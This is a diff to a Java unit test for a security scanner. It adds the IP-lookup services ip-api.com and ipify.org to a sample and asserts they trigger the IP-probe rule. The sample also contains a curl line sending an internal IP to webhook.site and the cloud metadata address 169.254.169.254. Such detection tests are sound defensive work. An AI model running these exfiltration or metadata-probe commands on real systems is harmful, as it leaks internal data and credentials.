@@ -40,7 +40,7 @@ public class NetworkScannerTest {
     public void exfil_probe_internal_and_metadata_are_classified() {
         String body = """
                 curl https://webhook.site/demo?ip=10.0.0.5
-                http://ifconfig.me 192.168.1.8 169.254.169.254 febf::1
+                http://ifconfig.me http://ip-api.com http://ipify.org 192.168.1.8 169.254.169.254 febf::1
                 localhost 127.0.0.1 0.0.0.0 metadata.internal
                 """;
         AuditResult result = securityScanner.scan(ScanRequest.of(
@@ -52,6 +52,11 @@ public class NetworkScannerTest {
         assertTrue(rules.contains("network_exfil_target"));
         assertTrue(rules.contains("network_ip_probe"));
         assertTrue(rules.contains("network_internal_probe"));
+        assertTrue("ip-api.com/ipify.org 也应命中 IP 探测",
+                result.getFindings().stream()
+                        .anyMatch(f -> "network_ip_probe".equals(f.getRuleId())
+                                && (f.getEvidence().contains("ip-api.com")
+                                || f.getEvidence().contains("ipify.org"))));
         assertTrue(result.getFindings().stream()
                 .anyMatch(f -> "169.254.169.254".equals(f.getEvidence())
                         && f.getSeverity() == SecuritySeverity.HIGH));
